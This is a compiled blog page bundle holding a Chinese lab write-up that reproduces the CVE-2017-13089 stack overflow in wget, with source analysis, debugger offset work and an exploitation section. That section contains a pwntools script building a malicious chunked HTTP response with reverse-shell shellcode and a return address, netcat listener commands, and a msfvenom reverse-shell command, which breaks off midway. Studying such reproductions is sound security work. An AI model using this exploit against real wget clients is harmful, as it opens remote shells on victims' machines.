import{_ as y}from"./ValaxyMain.vue_vue_type_style_index_0_lang-fe952921.js";import{_ as F,p as D,c as i,w as o,o as C,a as s,b as l,d as t,r as a,e as A}from"./app-a51598bf.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-9cc900c2.js";import"./YunCard.vue_vue_type_script_setup_true_lang-fac3e250.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-e8684ee8.js";const x="/images/pasted-275.png",d="/images/pasted-276.png",f="/images/pasted-277.png",h="/images/pasted-278.png",_="/images/pasted-279.png",u="/images/pasted-280.png",g="/images/pasted-281.png",m="/images/pasted-282.png",b="/images/pasted-283.png",Js=JSON.parse('{"title":"cve-2017-13089 wget栈溢出","description":"","frontmatter":{"layout":"post","title":"cve-2017-13089 wget栈溢出","tags":[],"categories":["漏洞复现"],"author":"1ss4k","date":"2021-03-24T23:08:00.000Z"},"headers":[{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"漏洞触发","slug":"漏洞触发","link":"#漏洞触发","children":[]},{"level":2,"title":"静态分析","slug":"静态分析","link":"#静态分析","children":[]},{"level":2,"title":"动态分析","slug":"动态分析","link":"#动态分析","children":[]},{"level":2,"title":"利用","slug":"利用","link":"#利用","children":[]}],"relativePath":"pages/posts/wget stack overflow.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/wget stack overflow.md","lastUpdated":1690730773000}'),c=JSON.parse('{"title":"cve-2017-13089 wget栈溢出","description":"","frontmatter":{"layout":"post","title":"cve-2017-13089 wget栈溢出","tags":[],"categories":["漏洞复现"],"author":"1ss4k","date":"2021-03-24T23:08:00.000Z"},"headers":[{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"漏洞触发","slug":"漏洞触发","link":"#漏洞触发","children":[]},{"level":2,"title":"静态分析","slug":"静态分析","link":"#静态分析","children":[]},{"level":2,"title":"动态分析","slug":"动态分析","link":"#动态分析","children":[]},{"level":2,"title":"利用","slug":"利用","link":"#利用","children":[]}],"relativePath":"pages/posts/wget stack overflow.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/wget stack overflow.md","lastUpdated":1690730773000}'),E={name:"pages/posts/wget stack overflow.md",data(){return{data:c,frontmatter:c.frontmatter,$frontmatter:c.frontmatter}},setup(){D("pageData",c)}},k={id:"环境搭建",tabindex:"-1"},v=s("p",null,[l("1、"),s("strong",null,"Ubuntu 16.04 64bit")],-1),w=s("p",null,[s("img",{src:x,alt:"upload successful"})],-1),B=s("p",null,[l("2、"),s("strong",null,"wget .19.1")],-1),z={id:"漏洞触发",tabindex:"-1"},T=s("p",null,"建立好poc文件之后，端口监听",-1),$=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"lp "),s("span",{style:{color:"#F78C6C"}},"9799"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}}," poc2")])])])],-1),I=s("p",null,"另一个窗口执行",-1),S=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"wget "),s("span",{style:{color:"#F78C6C"}},"127.0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"9799")])])])],-1),P=s("p",null,[s("img",{src:d,alt:"upload successful"})],-1),N={id:"静态分析",tabindex:"-1"},Z=s("p",null,"代码结构大致如下",-1),V=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"http.c"),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ...")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  statcode "),s("span",{style:{color:"#89DDFF"}},"=="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#F78C6C"}},"401"),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"    "),s("span",{style:{color:"#89DDFF"}},"--->"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#82AAFF"}},"skip_short_body"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F07178"}},"sock"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," contlen"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," chunked_transfer_encoding"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"--->")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  "),s("span",{style:{color:"#89DDFF"}},"}")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ...")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}")])])])],-1),O=s("p",null,"跟进skip_short_body函数",-1),U=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"skip_short_body"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"int"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"fd"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," wgint "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"contlen"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"bool"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"chunked"),s("span",{style:{color:"#89DDFF"}},"){")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  SKIP_SIZE "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#F78C6C"}},"512"),s("span",{style:{color:"#89DDFF"}},";")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  remaining_chunk_size "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},";")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  "),s("span",{style:{color:"#C792EA"}},"char"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#A6ACCD"}},"dlbuf"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F07178"}},"SKIP_SIZE "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},"];"),s("span",{style:{color:"#676E95","font-style":"italic"}}," //定义一个字符数组")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  "),s("span",{style:{color:"#A6ACCD"}},"dlbuf"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F07178"}},"SKIP_SIZE"),s("span",{style:{color:"#89DDFF"}},"]"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\0"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},";")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ...")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  "),s("span",{style:{color:"#C792EA"}},"char"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#F07178"}},"line "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#82AAFF"}},"fd_read_line"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F07178"}},"fd"),s("span",{style:{color:"#89DDFF"}},");"),s("span",{style:{color:"#676E95","font-style":"italic"}}," //首先获取到相应包的响应体的指针")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  remaining_chunk_size "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#82AAFF"}},"strtol"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F07178"}},"line"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"&"),s("span",{style:{color:"#F07178"}},"endl"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#F78C6C"}},"16"),s("span",{style:{color:"#89DDFF"}},");"),s("span",{style:{color:"#676E95","font-style":"italic"}}," //将line指向的值转换为整数值")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  contlen "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#82AAFF"}},"MIN"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F07178"}},"remaining_chunk_size"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," SKIP_SIZE"),s("span",{style:{color:"#89DDFF"}},");"),s("span",{style:{color:"#676E95","font-style":"italic"}},"//contlen表示真正的响应体的长度，这里两者取较小值")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ret "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#82AAFF"}},"fd_read"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F07178"}},"fd"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," dlbuf"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#82AAFF"}},"MIN"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F07178"}},"contlen"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F07178"}}," SKIP_SIZE"),s("span",{style:{color:"#89DDFF"}},"),"),s("span",{style:{color:"#F07178"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},");"),s("span",{style:{color:"#676E95","font-style":"italic"}}," //将fd指针指向的内容，复制到dlbuf中 ---> fd_read")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#F07178"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}")])])])],-1),K=s("p",null,"跟进fd_read函数，其在connect.c中。",-1),L=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"fd_read"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"int"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"fd"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"char"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"buf"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"int"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"bufsize"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"double"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"timeout"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  "),s("span",{style:{color:"#89DDFF"}},"--->"),s("span",{style:{color:"#A6ACCD"}}," sock_read函数")])])])],-1),H=s("p",null,"sock_read()如下",-1),q=s("div",{class:"language-c"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"sock_read"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"int"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"fd"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"char"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"buf"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"int"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#A6ACCD","font-style":"italic"}},"bufsize"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),J=s("p",null,"此处触发栈溢出。",-1),M={id:"动态分析",tabindex:"-1"},R=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"gdb wget")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#设置参数")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#FFCB6B"}},"set"),s("span",{style:{color:"#A6ACCD"}}," args "),s("span",{style:{color:"#F78C6C"}},"127.0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"9799"),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#设置断点在某函数开头")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b skip_short_body")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#设置断点在某函数末尾")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"disass skip_short_body")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"找到地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"000000000041f18d")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"r "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#运行")])])])],-1),j=s("p",null,"同时另一个窗口",-1),G=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"lp "),s("span",{style:{color:"#F78C6C"}},"9799"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}}," poc")])])])],-1),Q=s("p",null,[s("img",{src:f,alt:"upload successful"})],-1),W=s("p",null,"strol函数，传递的参数如下：",-1),X=s("p",null,[s("img",{src:h,alt:"upload successful"})],-1),Y=s("p",null,"调用fd_read的时候，往第二个参数0x7fffffffd140内写入传输到内容，即AAAA……",-1),ss=s("p",null,[s("img",{src:_,alt:"upload successful"}),l(" 然后返回到skip_short_body函数。为了方便后续的利用，需要计算栈偏移")],-1),ls=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"pwndbg"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," distance "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7fffffffd140"),s("span",{style:{color:"#A6ACCD"}}," $rbp"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#F78C6C"}},"8")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7fffffffd140"),s("span",{style:{color:"#A6ACCD"}},"->"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7fffffffd378"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"is"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"238"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"bytes"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"47"),s("span",{style:{color:"#82AAFF"}}," words"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"238"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"568")])])])],-1),os={id:"利用",tabindex:"-1"},ns=s("p",null,"需要先关闭栈保护，然后重新编译。",-1),as=s("p",null,[s("img",{src:u,alt:"upload successful"})],-1),es=s("p",null,"生成shellcode，ifconfig查看ip，-f c表示是C语言格式的",-1),ts=s("p",null,[s("img",{src:g,alt:"upload successful"})],-1),cs=s("p",null,"payload如下：",-1),ps=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"from"),s("span",{style:{color:"#A6ACCD"}}," pwn "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"import"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"""'),s("span",{style:{color:"#C3E88D"}},"HTTP/1.1 401 Not Authorized")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"Content-Type: text/plain; charset=UTF-8")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"Transfer-Encoding: chunked")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"Connection: keep-alive")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C3E88D"}},"-0xFFFFF000")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},'"""')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"port "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"6324"),s("span",{style:{color:"#89DDFF"}},")."),s("span",{style:{color:"#82AAFF"}},"replace"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\x00"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"''"),s("span",{style:{color:"#89DDFF"}},")[::-"),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sc "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}},"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\\x18\\xb4\\xc0\\xa8\\x70\\x02\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05"),s("span",{style:{color:"#89DDFF"}},'"')]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," sc "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"568"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#82AAFF"}},"len"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"sc"),s("span",{style:{color:"#89DDFF"}},"))*"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"A"),s("span",{style:{color:"#89DDFF"}},"'")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},'#payload += "\\xd0\\xd8\\xff\\xff\\xff\\x7f\\x00\\x00"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"7fffffffd140"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}},"\\n"),s("span",{style:{color:"#C3E88D"}},"0"),s("span",{style:{color:"#A6ACCD"}},"\\n"),s("span",{style:{color:"#89DDFF"}},'"')]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"with"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"open"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"exp1"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"wb"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"as"),s("span",{style:{color:"#A6ACCD"}}," f"),s("span",{style:{color:"#89DDFF"}},":")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"        f"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"write"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"payload"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),rs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#A窗口 监听端口")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"nvlp "),s("span",{style:{color:"#F78C6C"}},"6324"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}}," exp1")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#B窗口 调试")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#FFCB6B"}},"set"),s("span",{style:{color:"#A6ACCD"}}," args "),s("span",{style:{color:"#F78C6C"}},"127.0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"6324")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b skip_short_body")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"或")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"b "),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"000000000041f18d")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#676E95","font-style":"italic"}},"#C窗口 连接")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nc "),s("span",{style:{color:"#F78C6C"}},"127.0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"6324")])])])],-1),ys=s("p",null,"按照这个步骤执行，一直没成功，不知道是什么原因，从头再来执行一遍。",-1),Fs=s("p",null,"(1)生成shellcode",-1),Ds=s("p",null,"msf在kali中有，且ubuntu中安装比较麻烦，故不再安装。",-1),is=s("p",null,"先msf进入，再输入如下语句生成sc。",-1),Cs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"msf5 "),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," msfvenom "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"p linux"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"x64"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"shell_reverse_tcp 